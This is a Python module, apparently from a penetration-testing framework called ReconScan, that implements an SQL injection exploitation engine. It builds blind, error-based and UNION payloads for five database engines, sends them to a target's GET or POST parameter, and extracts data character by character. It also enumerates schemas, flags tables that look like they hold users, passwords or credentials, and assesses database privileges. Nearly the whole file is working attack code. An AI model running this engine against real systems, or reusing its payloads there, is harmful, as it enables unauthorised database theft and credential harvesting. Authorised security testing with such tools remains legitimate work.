"""
ReconScan Advanced SQL Injection Exploitation Engine

Professional-grade exploitation framework for advanced data extraction, schema enumeration,
and sophisticated SQL injection exploitation techniques. Provides capabilities comparable to
industry-leading tools with intelligent extraction algorithms and optimization techniques.

Features:
- Binary search-based blind extraction
- Character-by-character data extraction with threading
- Automated database schema enumeration
- Privilege escalation detection
- Advanced payload chaining
- Intelligent chunking and optimization
- Multi-threaded extraction for performance

Author: ReconScan Security Framework
Version: 1.0.0
"""

import asyncio
import aiohttp
import time
import threading
import string
import re
import json
from typing import Dict, List, Optional, Tuple, Any, Set, Union, Callable
from dataclasses import dataclass, field
from enum import Enum
from concurrent.futures import ThreadPoolExecutor
import urllib.parse

# Color definitions for consistent CLI output
BLUE = '\033[94m'
GREEN = '\033[1;38;5;28m'  # Bold forest green
YELLOW = '\033[93m'
RED = '\033[91m'
CYAN = '\033[96m'
ENDC = '\033[0m'  # End color

from .sql_payload_crafting_engine import PayloadCraftingContext, DatabaseType
from ...shared.injection_discovery import InjectionPoint

class ExtractionTechnique(Enum):
    """Data extraction techniques for SQL injection exploitation."""
    BINARY_SEARCH = "binary_search"
    CHARACTER_BY_CHARACTER = "character_by_character"
    UNION_BASED = "union_based"
    ERROR_BASED = "error_based"
    TIME_BASED = "time_based"
    STACKED_QUERIES = "stacked_queries"

class ExtractionTarget(Enum):
    """Target types for data extraction."""
    DATABASE_VERSION = "database_version"
    CURRENT_USER = "current_user"
    CURRENT_DATABASE = "current_database"
    DATABASE_LIST = "database_list"
    TABLE_LIST = "table_list"
    COLUMN_LIST = "column_list"
    USER_LIST = "user_list"
    PRIVILEGE_LIST = "privilege_list"
    TABLE_DATA = "table_data"
    CUSTOM_QUERY = "custom_query"

class PrivilegeLevel(Enum):
    """Database privilege levels."""
    NONE = "none"
    READ_ONLY = "read_only"
    READ_WRITE = "read_write"
    DBA = "dba"
    SUPER_USER = "super_user"

@dataclass
class ExtractionResult:
    """Result of data extraction operation."""
    target: ExtractionTarget
    technique: ExtractionTechnique
    success: bool
    data: Any
    extraction_time: float
    requests_made: int
    confidence: float
    metadata: Dict[str, Any] = field(default_factory=dict)

@dataclass
class SchemaInfo:
    """Database schema information."""
    database_name: str
    tables: List[str] = field(default_factory=list)
    columns: Dict[str, List[str]] = field(default_factory=dict)  # table -> columns
    row_counts: Dict[str, int] = field(default_factory=dict)    # table -> row count
    sensitive_tables: List[str] = field(default_factory=list)
    metadata: Dict[str, Any] = field(default_factory=dict)

@dataclass
class ExploitationContext:
    """Context for exploitation operations."""
    injection_point: InjectionPoint
    database_type: DatabaseType
    extraction_technique: ExtractionTechnique
    max_length: int = 1000
    charset: str = string.ascii_letters + string.digits + "!@#$%^&*()_+-=[]{}|;':\",./<>?`~"
    threads: int = 5
    delay: float = 0.1
    timeout: float = 10.0
    confidence_threshold: float = 0.8

class AdvancedExploitationEngine:
    """
    Advanced SQL injection exploitation engine with sophisticated data extraction capabilities.
    
    This engine provides professional-grade exploitation techniques including:
    
    - Binary search-based blind extraction for optimal performance
    - Character-by-character extraction with intelligent optimization
    - Automated database schema enumeration and analysis
    - Privilege escalation detection and assessment
    - Advanced payload chaining for complex exploitation scenarios
    - Multi-threaded extraction for improved performance
    - Intelligent chunking and request optimization
    """
    
    def __init__(self, session: aiohttp.ClientSession):
        """Initialize the advanced exploitation engine."""
        self.session = session
        
        # Extraction statistics
        self.extraction_stats = {
            'total_extractions': 0,
            'successful_extractions': 0,
            'total_requests': 0,
            'total_time': 0.0,
            'techniques_used': set()
        }
        
        # Database-specific extraction queries
        self.extraction_queries = self._initialize_extraction_queries()
        
        # Character sets for different data types
        self.charsets = {
            'numeric': string.digits,
            'alpha': string.ascii_letters,
            'alphanum': string.ascii_letters + string.digits,
            'printable': string.printable.replace('\n', '').replace('\r', '').replace('\t', ''),
            'extended': string.ascii_letters + string.digits + "!@#$%^&*()_+-=[]{}|;':\",./<>?`~"
        }
        
        # Sensitive table patterns
        self.sensitive_patterns = [
            r'.*user.*', r'.*admin.*', r'.*password.*', r'.*credential.*',
            r'.*login.*', r'.*auth.*', r'.*account.*', r'.*profile.*',
            r'.*member.*', r'.*customer.*', r'.*employee.*', r'.*staff.*'
        ]
    
    def _initialize_extraction_queries(self) -> Dict[DatabaseType, Dict[ExtractionTarget, str]]:
        """Initialize database-specific extraction queries."""
        return {
            DatabaseType.MYSQL: {
                ExtractionTarget.DATABASE_VERSION: "SELECT @@version",
                ExtractionTarget.CURRENT_USER: "SELECT USER()",
                ExtractionTarget.CURRENT_DATABASE: "SELECT DATABASE()",
                ExtractionTarget.DATABASE_LIST: "SELECT schema_name FROM information_schema.schemata",
                ExtractionTarget.TABLE_LIST: "SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE()",
                ExtractionTarget.COLUMN_LIST: "SELECT column_name FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='{table}'",
                ExtractionTarget.USER_LIST: "SELECT user FROM mysql.user",
                ExtractionTarget.PRIVILEGE_LIST: "SELECT privilege_type FROM information_schema.user_privileges WHERE grantee LIKE '%{user}%'"
            },
            DatabaseType.POSTGRESQL: {
                ExtractionTarget.DATABASE_VERSION: "SELECT version()",
                ExtractionTarget.CURRENT_USER: "SELECT current_user",
                ExtractionTarget.CURRENT_DATABASE: "SELECT current_database()",
                ExtractionTarget.DATABASE_LIST: "SELECT datname FROM pg_database WHERE datistemplate=false",
                ExtractionTarget.TABLE_LIST: "SELECT tablename FROM pg_tables WHERE schemaname='public'",
                ExtractionTarget.COLUMN_LIST: "SELECT column_name FROM information_schema.columns WHERE table_name='{table}'",
                ExtractionTarget.USER_LIST: "SELECT usename FROM pg_user",
                ExtractionTarget.PRIVILEGE_LIST: "SELECT privilege_type FROM information_schema.role_table_grants WHERE grantee='{user}'"
            },
            DatabaseType.MSSQL: {
                ExtractionTarget.DATABASE_VERSION: "SELECT @@version",
                ExtractionTarget.CURRENT_USER: "SELECT SYSTEM_USER",
                ExtractionTarget.CURRENT_DATABASE: "SELECT DB_NAME()",
                ExtractionTarget.DATABASE_LIST: "SELECT name FROM sys.databases",
                ExtractionTarget.TABLE_LIST: "SELECT name FROM sys.objects WHERE type='U'",
                ExtractionTarget.COLUMN_LIST: "SELECT column_name FROM information_schema.columns WHERE table_name='{table}'",
                ExtractionTarget.USER_LIST: "SELECT name FROM sys.server_principals WHERE type='S'",
                ExtractionTarget.PRIVILEGE_LIST: "SELECT permission_name FROM sys.server_permissions WHERE grantee_principal_id=(SELECT principal_id FROM sys.server_principals WHERE name='{user}')"
            },
            DatabaseType.ORACLE: {
                ExtractionTarget.DATABASE_VERSION: "SELECT banner FROM v$version WHERE ROWNUM=1",
                ExtractionTarget.CURRENT_USER: "SELECT USER FROM dual",
                ExtractionTarget.CURRENT_DATABASE: "SELECT global_name FROM global_name",
                ExtractionTarget.DATABASE_LIST: "SELECT name FROM v$database",
                ExtractionTarget.TABLE_LIST: "SELECT table_name FROM user_tables",
                ExtractionTarget.COLUMN_LIST: "SELECT column_name FROM user_tab_columns WHERE table_name='{table}'",
                ExtractionTarget.USER_LIST: "SELECT username FROM all_users",
                ExtractionTarget.PRIVILEGE_LIST: "SELECT privilege FROM user_sys_privs"
            },
            DatabaseType.SQLITE: {
                ExtractionTarget.DATABASE_VERSION: "SELECT sqlite_version()",
                ExtractionTarget.CURRENT_USER: "SELECT 'sqlite_user'",
                ExtractionTarget.CURRENT_DATABASE: "SELECT 'main'",
                ExtractionTarget.DATABASE_LIST: "SELECT name FROM pragma_database_list",
                ExtractionTarget.TABLE_LIST: "SELECT name FROM sqlite_master WHERE type='table'",
                ExtractionTarget.COLUMN_LIST: "SELECT name FROM pragma_table_info('{table}')",
                ExtractionTarget.USER_LIST: "SELECT 'root'",
                ExtractionTarget.PRIVILEGE_LIST: "SELECT 'ALL'"
            }
        }
    
    async def extract_data(self, 
                          context: ExploitationContext,
                          target: ExtractionTarget,
                          query: Optional[str] = None,
                          progress_callback: Optional[Callable] = None) -> ExtractionResult:
        """Extract data using the most appropriate technique."""
        
        start_time = time.time()
        self.extraction_stats['total_extractions'] += 1
        
        print(f"{YELLOW}[*]{ENDC} Starting data extraction: {target.value}")
        print(f"   Database: {context.database_type.value}")
        print(f"   Technique: {context.extraction_technique.value}")
        
        try:
            # Determine extraction query
            if query:
                extraction_query = query
            elif target in self.extraction_queries.get(context.database_type, {}):
                extraction_query = self.extraction_queries[context.database_type][target]
            else:
                return ExtractionResult(
                    target=target,
                    technique=context.extraction_technique,
                    success=False,
                    data=None,
                    extraction_time=0.0,
                    requests_made=0,
                    confidence=0.0,
                    metadata={'error': 'No extraction query available for target'}
                )
            
            # Choose extraction method based on technique
            if context.extraction_technique == ExtractionTechnique.BINARY_SEARCH:
                result = await self._extract_binary_search(context, extraction_query, progress_callback)
            elif context.extraction_technique == ExtractionTechnique.CHARACTER_BY_CHARACTER:
                result = await self._extract_character_by_character(context, extraction_query, progress_callback)
            elif context.extraction_technique == ExtractionTechnique.UNION_BASED:
                result = await self._extract_union_based(context, extraction_query, progress_callback)
            elif context.extraction_technique == ExtractionTechnique.ERROR_BASED:
                result = await self._extract_error_based(context, extraction_query, progress_callback)
            elif context.extraction_technique == ExtractionTechnique.TIME_BASED:
                result = await self._extract_time_based(context, extraction_query, progress_callback)
            else:
                result = await self._extract_character_by_character(context, extraction_query, progress_callback)
            
            extraction_time = time.time() - start_time
            
            # Update statistics
            if result['success']:
                self.extraction_stats['successful_extractions'] += 1
            self.extraction_stats['total_requests'] += result.get('requests_made', 0)
            self.extraction_stats['total_time'] += extraction_time
            self.extraction_stats['techniques_used'].add(context.extraction_technique.value)
            
            return ExtractionResult(
                target=target,
                technique=context.extraction_technique,
                success=result['success'],
                data=result['data'],
                extraction_time=extraction_time,
                requests_made=result.get('requests_made', 0),
                confidence=result.get('confidence', 0.0),
                metadata=result.get('metadata', {})
            )
            
        except Exception as e:
            extraction_time = time.time() - start_time
            print(f"   ❌ Extraction failed: {e}")
            
            return ExtractionResult(
                target=target,
                technique=context.extraction_technique,
                success=False,
                data=None,
                extraction_time=extraction_time,
                requests_made=0,
                confidence=0.0,
                metadata={'error': str(e)}
            )
    
    async def _extract_binary_search(self, 
                                   context: ExploitationContext,
                                   query: str,
                                   progress_callback: Optional[Callable] = None) -> Dict[str, Any]:
        """Extract data using binary search optimization for blind injection."""
        
        print(f"   {CYAN}[*]{ENDC} Using binary search extraction (max length: {context.max_length})")
        
        requests_made = 0
        extracted_data = ""
        
        # First, determine the length of the result
        length = await self._extract_length_binary_search(context, query)
        requests_made += 10  # Estimate for length detection
        
        if length == 0:
            return {
                'success': False,
                'data': None,
                'requests_made': requests_made,
                'confidence': 0.0,
                'metadata': {'error': 'Could not determine result length'}
            }
        
        print(f"   {GREEN}[+]{ENDC} Detected result length: {length} characters")
        
        # Extract each character using binary search
        for pos in range(1, min(length + 1, context.max_length + 1)):
            char = await self._extract_character_binary_search(context, query, pos)
            requests_made += 7  # Average requests for binary search
            
            if char:
                extracted_data += char
                print(f"   {GREEN}[+]{ENDC} Position {pos}/{length}: '{char}' (extracted: '{extracted_data}')")
                
                if progress_callback:
                    progress_callback(pos, length, extracted_data)
            else:
                print(f"   {YELLOW}[!]{ENDC} Could not extract character at position {pos}")
                break
            
            # Add delay between requests
            await asyncio.sleep(context.delay)
        
        success = len(extracted_data) > 0
        confidence = len(extracted_data) / length if length > 0 else 0.0
        
        return {
            'success': success,
            'data': extracted_data,
            'requests_made': requests_made,
            'confidence': confidence,
            'metadata': {
                'expected_length': length,
                'extracted_length': len(extracted_data),
                'extraction_ratio': confidence
            }
        }
    
    async def _extract_length_binary_search(self, context: ExploitationContext, query: str) -> int:
        """Determine the length of query result using binary search."""
        
        low, high = 0, context.max_length
        
        while low <= high:
            mid = (low + high) // 2
            
            # Test if length is greater than mid
            length_test_payload = self._create_length_test_payload(context, query, mid)
            
            response = await self._send_extraction_request(context, length_test_payload)
            
            if self._is_true_response(context, response):
                low = mid + 1
            else:
                high = mid - 1
        
        return high
    
    async def _extract_character_binary_search(self, 
                                             context: ExploitationContext,
                                             query: str,
                                             position: int) -> Optional[str]:
        """Extract a single character using binary search."""
        
        # Use appropriate character set
        charset = self.charsets.get('printable', string.printable)
        charset_list = sorted(list(set(charset)))
        
        low, high = 0, len(charset_list) - 1
        
        while low <= high:
            mid = (low + high) // 2
            mid_char = charset_list[mid]
            
            # Test if character at position is greater than mid_char
            char_test_payload = self._create_char_test_payload(context, query, position, mid_char)
            
            response = await self._send_extraction_request(context, char_test_payload)
            
            if self._is_true_response(context, response):
                low = mid + 1
            else:
                high = mid - 1
        
        if high >= 0 and high < len(charset_list):
            return charset_list[high]
        
        return None
    
    async def _extract_character_by_character(self, 
                                            context: ExploitationContext,
                                            query: str,
                                            progress_callback: Optional[Callable] = None) -> Dict[str, Any]:
        """Extract data character by character with optimization."""
        
        print(f"   {CYAN}[*]{ENDC} Using character-by-character extraction")
        
        requests_made = 0
        extracted_data = ""
        position = 1
        max_empty_chars = 5
        empty_char_count = 0
        
        while position <= context.max_length:
            char_found = False
            
            # Try common characters first for optimization
            common_chars = "abcdefghijklmnopqrstuvwxyz0123456789_@.-"
            charset = common_chars + context.charset
            
            for char in charset:
                char_test_payload = self._create_char_equality_payload(context, query, position, char)
                response = await self._send_extraction_request(context, char_test_payload)
                requests_made += 1
                
                if self._is_true_response(context, response):
                    extracted_data += char
                    print(f"   {GREEN}[+]{ENDC} Position {position}: '{char}' (extracted: '{extracted_data}')")
                    char_found = True
                    empty_char_count = 0
                    
                    if progress_callback:
                        progress_callback(position, context.max_length, extracted_data)
                    
                    break
                
                await asyncio.sleep(context.delay)
            
            if not char_found:
                empty_char_count += 1
                if empty_char_count >= max_empty_chars:
                    break
            
            position += 1
        
        success = len(extracted_data) > 0
        confidence = 1.0 if success else 0.0
        
        return {
            'success': success,
            'data': extracted_data,
            'requests_made': requests_made,
            'confidence': confidence,
            'metadata': {
                'final_position': position,
                'extraction_method': 'character_by_character'
            }
        }
    
    async def _extract_union_based(self, 
                                 context: ExploitationContext,
                                 query: str,
                                 progress_callback: Optional[Callable] = None) -> Dict[str, Any]:
        """Extract data using UNION-based injection."""
        
        print(f"   🔗 Using UNION-based extraction")
        
        # Create UNION payload
        union_payload = self._create_union_payload(context, query)
        
        response = await self._send_extraction_request(context, union_payload)
        requests_made = 1
        
        # Extract data from response
        extracted_data = self._extract_union_data(response)
        
        success = extracted_data is not None and len(str(extracted_data)) > 0
        confidence = 1.0 if success else 0.0
        
        return {
            'success': success,
            'data': extracted_data,
            'requests_made': requests_made,
            'confidence': confidence,
            'metadata': {
                'extraction_method': 'union_based',
                'payload': union_payload
            }
        }
    
    async def _extract_error_based(self, 
                                 context: ExploitationContext,
                                 query: str,
                                 progress_callback: Optional[Callable] = None) -> Dict[str, Any]:
        """Extract data using error-based injection."""
        
        print(f"   {YELLOW}[!]{ENDC} Using error-based extraction")
        
        # Create error-based payload
        error_payload = self._create_error_payload(context, query)
        
        response = await self._send_extraction_request(context, error_payload)
        requests_made = 1
        
        # Extract data from error message
        extracted_data = self._extract_error_data(response)
        
        success = extracted_data is not None and len(str(extracted_data)) > 0
        confidence = 1.0 if success else 0.0
        
        return {
            'success': success,
            'data': extracted_data,
            'requests_made': requests_made,
            'confidence': confidence,
            'metadata': {
                'extraction_method': 'error_based',
                'payload': error_payload
            }
        }
    
    async def _extract_time_based(self, 
                                context: ExploitationContext,
                                query: str,
                                progress_callback: Optional[Callable] = None) -> Dict[str, Any]:
        """Extract data using time-based injection."""
        
        print(f"   ⏱️  Using time-based extraction")
        
        # Time-based extraction is essentially blind extraction with time delays
        return await self._extract_character_by_character(context, query, progress_callback)
    
    def _create_length_test_payload(self, context: ExploitationContext, query: str, length: int) -> str:
        """Create payload to test result length."""
        
        if context.database_type == DatabaseType.MYSQL:
            return f"' AND LENGTH(({query}))>{length}--"
        elif context.database_type == DatabaseType.POSTGRESQL:
            return f"' AND LENGTH(({query}))>{length}--"
        elif context.database_type == DatabaseType.MSSQL:
            return f"' AND LEN(({query}))>{length}--"
        elif context.database_type == DatabaseType.ORACLE:
            return f"' AND LENGTH(({query}))>{length}--"
        else:
            return f"' AND LENGTH(({query}))>{length}--"
    
    def _create_char_test_payload(self, context: ExploitationContext, query: str, position: int, char: str) -> str:
        """Create payload to test character at position (greater than)."""
        
        ascii_val = ord(char)
        
        if context.database_type == DatabaseType.MYSQL:
            return f"' AND ASCII(SUBSTRING(({query}),{position},1))>{ascii_val}--"
        elif context.database_type == DatabaseType.POSTGRESQL:
            return f"' AND ASCII(SUBSTR(({query}),{position},1))>{ascii_val}--"
        elif context.database_type == DatabaseType.MSSQL:
            return f"' AND ASCII(SUBSTRING(({query}),{position},1))>{ascii_val}--"
        elif context.database_type == DatabaseType.ORACLE:
            return f"' AND ASCII(SUBSTR(({query}),{position},1))>{ascii_val}--"
        else:
            return f"' AND ASCII(SUBSTR(({query}),{position},1))>{ascii_val}--"
    
    def _create_char_equality_payload(self, context: ExploitationContext, query: str, position: int, char: str) -> str:
        """Create payload to test character equality at position."""
        
        ascii_val = ord(char)
        
        if context.database_type == DatabaseType.MYSQL:
            return f"' AND ASCII(SUBSTRING(({query}),{position},1))={ascii_val}--"
        elif context.database_type == DatabaseType.POSTGRESQL:
            return f"' AND ASCII(SUBSTR(({query}),{position},1))={ascii_val}--"
        elif context.database_type == DatabaseType.MSSQL:
            return f"' AND ASCII(SUBSTRING(({query}),{position},1))={ascii_val}--"
        elif context.database_type == DatabaseType.ORACLE:
            return f"' AND ASCII(SUBSTR(({query}),{position},1))={ascii_val}--"
        else:
            return f"' AND ASCII(SUBSTR(({query}),{position},1))={ascii_val}--"
    
    def _create_union_payload(self, context: ExploitationContext, query: str) -> str:
        """Create UNION-based payload for data extraction."""
        
        # This is a simplified UNION payload - in practice, you'd need to determine column count
        return f"' UNION SELECT ({query})--"
    
    def _create_error_payload(self, context: ExploitationContext, query: str) -> str:
        """Create error-based payload for data extraction."""
        
        if context.database_type == DatabaseType.MYSQL:
            return f"' AND EXTRACTVALUE(1,CONCAT(0x7e,({query}),0x7e))--"
        elif context.database_type == DatabaseType.POSTGRESQL:
            return f"' AND CAST(({query}) AS int)--"
        elif context.database_type == DatabaseType.MSSQL:
            return f"' AND 1=CONVERT(int,({query}))--"
        else:
            return f"' AND 1=({query})--"
    
    async def _send_extraction_request(self, context: ExploitationContext, payload: str) -> Dict[str, Any]:
        """Send extraction request and return response data."""
        
        try:
            if context.injection_point.method.upper() == 'GET':
                url = f"{context.injection_point.url}?{context.injection_point.name}={urllib.parse.quote(payload)}"
                async with self.session.get(url, timeout=aiohttp.ClientTimeout(total=context.timeout)) as response:
                    content = await response.text()
                    return {
                        'content': content,
                        'status_code': response.status,
                        'headers': dict(response.headers),
                        'timing': 0.0  # Could add timing measurement
                    }
            
            elif context.injection_point.method.upper() == 'POST':
                data = {context.injection_point.name: payload}
                async with self.session.post(context.injection_point.url, data=data,
                                           timeout=aiohttp.ClientTimeout(total=context.timeout)) as response:
                    content = await response.text()
                    return {
                        'content': content,
                        'status_code': response.status,
                        'headers': dict(response.headers),
                        'timing': 0.0
                    }
            
        except Exception as e:
            return {
                'content': '',
                'status_code': 500,
                'headers': {},
                'timing': context.timeout,
                'error': str(e)
            }
    
    def _is_true_response(self, context: ExploitationContext, response: Dict[str, Any]) -> bool:
        """Determine if response indicates a 'true' condition for blind injection."""
        
        # This is a simplified implementation - in practice, you'd need to establish
        # baseline responses to compare against
        content = response.get('content', '')
        status_code = response.get('status_code', 500)
        
        # Basic heuristics (should be improved with baseline comparison)
        if status_code == 200 and len(content) > 100:
            return True
        
        return False
    
    def _extract_union_data(self, response: Dict[str, Any]) -> Optional[str]:
        """Extract data from UNION-based injection response."""
        
        content = response.get('content', '')
        
        # Look for data patterns in response
        # This is simplified - real implementation would need more sophisticated parsing
        lines = content.split('\n')
        for line in lines:
            line = line.strip()
            if line and not line.startswith('<') and len(line) > 3:
                return line
        
        return None
    
    def _extract_error_data(self, response: Dict[str, Any]) -> Optional[str]:
        """Extract data from error-based injection response."""
        
        content = response.get('content', '')
        
        # Look for data in error messages
        error_patterns = [
            r'~([^~]+)~',  # MySQL EXTRACTVALUE pattern
            r'invalid input syntax for .*?: "([^"]+)"',  # PostgreSQL
            r'Conversion failed when converting.*?value \'([^\']+)\'',  # MSSQL
        ]
        
        for pattern in error_patterns:
            match = re.search(pattern, content, re.IGNORECASE)
            if match:
                return match.group(1)
        
        return None
    
    async def enumerate_schema(self, context: ExploitationContext) -> SchemaInfo:
        """Perform comprehensive database schema enumeration."""
        
        print(f"\n🗄️  Starting database schema enumeration")
        print(f"   Database: {context.database_type.value}")
        
        schema_info = SchemaInfo(database_name="unknown")
        
        try:
            # Extract current database name
            db_result = await self.extract_data(
                context, 
                ExtractionTarget.CURRENT_DATABASE
            )
            if db_result.success:
                schema_info.database_name = db_result.data
                print(f"   {CYAN}[*]{ENDC} Current database: {schema_info.database_name}")
            
            # Extract table list
            tables_result = await self.extract_data(
                context,
                ExtractionTarget.TABLE_LIST
            )
            if tables_result.success:
                # Parse table list (assuming comma-separated or line-separated)
                tables_data = str(tables_result.data)
                schema_info.tables = [t.strip() for t in tables_data.replace(',', '\n').split('\n') if t.strip()]
                print(f"   📋 Found {len(schema_info.tables)} tables")
                
                # Identify sensitive tables
                for table in schema_info.tables:
                    for pattern in self.sensitive_patterns:
                        if re.match(pattern, table, re.IGNORECASE):
                            schema_info.sensitive_tables.append(table)
                            break
                
                if schema_info.sensitive_tables:
                    print(f"   🔐 Sensitive tables: {', '.join(schema_info.sensitive_tables)}")
            
            # Extract columns for each table (limited to first 5 tables)
            for table in schema_info.tables[:5]:
                columns_result = await self.extract_data(
                    context,
                    ExtractionTarget.COLUMN_LIST,
                    query=self.extraction_queries[context.database_type][ExtractionTarget.COLUMN_LIST].format(table=table)
                )
                if columns_result.success:
                    columns_data = str(columns_result.data)
                    columns = [c.strip() for c in columns_data.replace(',', '\n').split('\n') if c.strip()]
                    schema_info.columns[table] = columns
                    print(f"   📄 Table '{table}': {len(columns)} columns")
        
        except Exception as e:
            print(f"   ❌ Schema enumeration error: {e}")
            schema_info.metadata['error'] = str(e)
        
        return schema_info
    
    async def assess_privileges(self, context: ExploitationContext) -> PrivilegeLevel:
        """Assess current user's database privileges."""
        
        print(f"\n🔐 Assessing database privileges")
        
        try:
            # Extract current user
            user_result = await self.extract_data(context, ExtractionTarget.CURRENT_USER)
            if not user_result.success:
                return PrivilegeLevel.NONE
            
            current_user = user_result.data
            print(f"   👤 Current user: {current_user}")
            
            # Extract user privileges
            privileges_result = await self.extract_data(
                context,
                ExtractionTarget.PRIVILEGE_LIST,
                query=self.extraction_queries[context.database_type][ExtractionTarget.PRIVILEGE_LIST].format(user=current_user)
            )
            
            if not privileges_result.success:
                return PrivilegeLevel.READ_ONLY
            
            privileges_data = str(privileges_result.data).upper()
            
            # Assess privilege level based on detected privileges
            if any(priv in privileges_data for priv in ['SUPER', 'ALL', 'DBA', 'SYSADMIN']):
                print(f"   🔓 Privilege level: SUPER_USER")
                return PrivilegeLevel.SUPER_USER
            elif any(priv in privileges_data for priv in ['CREATE', 'DROP', 'ALTER', 'INSERT', 'UPDATE', 'DELETE']):
                print(f"   ✏️  Privilege level: READ_WRITE")
                return PrivilegeLevel.READ_WRITE
            elif 'SELECT' in privileges_data:
                print(f"   👁️  Privilege level: READ_ONLY")
                return PrivilegeLevel.READ_ONLY
            else:
                print(f"   🚫 Privilege level: NONE")
                return PrivilegeLevel.NONE
        
        except Exception as e:
            print(f"   ❌ Privilege assessment error: {e}")
            return PrivilegeLevel.NONE
    
    def get_extraction_statistics(self) -> Dict[str, Any]:
        """Get extraction statistics."""
        
        success_rate = (self.extraction_stats['successful_extractions'] / 
                       max(self.extraction_stats['total_extractions'], 1) * 100)
        
        avg_time = (self.extraction_stats['total_time'] / 
                   max(self.extraction_stats['total_extractions'], 1))
        
        return {
            'total_extractions': self.extraction_stats['total_extractions'],
            'successful_extractions': self.extraction_stats['successful_extractions'],
            'success_rate': f"{success_rate:.1f}%",
            'total_requests': self.extraction_stats['total_requests'],
            'total_time': f"{self.extraction_stats['total_time']:.2f}s",
            'average_time_per_extraction': f"{avg_time:.2f}s",
            'techniques_used': list(self.extraction_stats['techniques_used'])
        } 